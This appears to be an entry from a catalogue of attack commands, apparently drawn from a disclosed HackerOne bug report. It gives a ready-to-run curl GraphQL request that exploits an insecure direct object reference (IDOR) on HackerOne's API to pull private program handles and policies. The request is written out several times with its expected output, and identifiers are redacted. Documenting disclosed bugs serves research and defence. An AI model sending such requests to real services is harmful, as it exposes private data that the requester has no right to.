---
id: cmd-graphql-query-program-details
data: >-
  curl -X POST
  "https://api.hackerone.com/graphql?embedded_submission_form_uuid=█████████" -H
  "Content-Type: application/json" -d '{"query":"query { node(id:
  \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on
  EmbeddedSubmissionForm { id, uuid team { handle policy } }}}","variables":{}}'
tags:
  - graphql
  - query
  - disclosure
type: command
output: >-
  { "data": { "node": { "id": "...", "uuid": "███", "team": { "handle":
  "██████████", "policy": "The policy." } } } }
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.632Z'
verified: false
validated: true
submitted: true
---
# graphql-query-program-details

## Command

```bash
curl -X POST "https://api.hackerone.com/graphql?embedded_submission_form_uuid=█████████" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { node(id: \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on EmbeddedSubmissionForm { id, uuid team { handle policy } }}}","variables":{}}'
```

## Description

Performs a GraphQL POST to HackerOne using a UUID parameter to fetch private program details like team handle and policy via IDOR.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| embedded_submission_form_uuid | The extracted UUID | Yes |
| id | Node ID in query | Yes |
| query | GraphQL query for team fields | Yes |
| variables | Empty object | No |

## Examples

### Basic Usage

```bash
curl -X POST "https://api.hackerone.com/graphql?embedded_submission_form_uuid=█████████" -H "Content-Type: application/json" -d '{"query":"query { node(id: \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on EmbeddedSubmissionForm { id, uuid team { handle policy } }}}","variables":{}}'
```

### Advanced Usage

Add headers for testing:
```bash
curl -X POST ... -H "User-Agent: Custom"
```

## Expected Output

JSON with sensitive info: `{ "data": { "node": { "team": { "handle": "██████████", "policy": "..." } } } }`.

## Related

- [[Related Procedure: Use-UUID-to-Query-Private-Program-Details]]
